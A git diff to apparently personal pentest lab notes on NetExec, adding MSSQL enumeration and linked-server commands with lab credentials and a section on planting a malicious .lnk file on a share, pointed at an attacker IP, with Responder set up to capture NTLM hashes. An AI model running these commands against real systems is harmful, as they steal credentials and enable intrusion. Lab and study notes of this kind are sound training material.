@@ -19,7 +19,7 @@ netexec smb 10.10.100.152 -u Eric.Wallows -p 'EricLikesRunning800'  --generate-k
 
 ```
 
-Example from [HackTheBox machine The Frizz](htb-thefrizz.md)
+Example from "HackTheBox machine The Frizz".
 
 
 ## Installation
@@ -81,7 +81,27 @@ nxc ldap 192.168.209.21 -u christopher.lewis -p 'Lalalala1234.' --active-users
 nxc ldap 192.168.209.21 -u christopher.lewis -p 'Lalalala1234.' -k --get-sid 
 Domain SID S-1-5-21-1969309164-1513403977-1686805993
 
+
+
+####################
+# mysql
+###################
+nxc mssql 10.129.29.125 --port 6520 -u sqlsvc -p 'TI0LKcfHzZw1Vv'  
+
+# Enumerate the database commnands
+nxc mssql 10.129.29.125 --port 6520 -u sqlsvc -p 'TI0LKcfHzZw1Vv' -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+# Find Linked Servers: The enum_links module queries the database to enumerate configured MSSQL linked servers.
+nxc mssql 10.129.29.125 --port 6520 -u sqlsvc -p "TI0LKcfHzZw1Vv" -M enum_links
+
+# Execute a MSSQL query specified in the COMMAND argument on the linked server specified in LINKED_SERVER.
+nxc mssql 10.129.29.125 --port 6520 -u sqlsvc -p "TI0LKcfHzZw1Vv"  -M exec_on_link -o LINKED_SERVER=SQL07 COMMAND='select @@servername'
+
+
 ```
+
+
+
 
 
 ## NTLM relay
@@ -94,5 +114,23 @@ nxc smb 192.168.245.173 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M slinky -o 
 
 impacket-ntlmrelayx --no-http-server -smb2support -tf IPs/allIPs.txt 
 
+```
+
+
+
+## .lnk File Attack: Capturing Hashes with a Malicious .lnk File PART 2, generated with -M slinky 
+
+If a share has READ/WRITE access, then you can create a malicious.lnk by using the slinky module:
 
 ```
+nxc smb $ip 0 -d nara-security.com -u 'guest' -p '' -M slinky -o NAME=malicious SERVER='192.168.45.172'
+
+# Server is the attacker IP
+```
+
+Just have ready the responder to capture hashes:
+
+```
+sudo responder -w -d -I tun0
+```
+
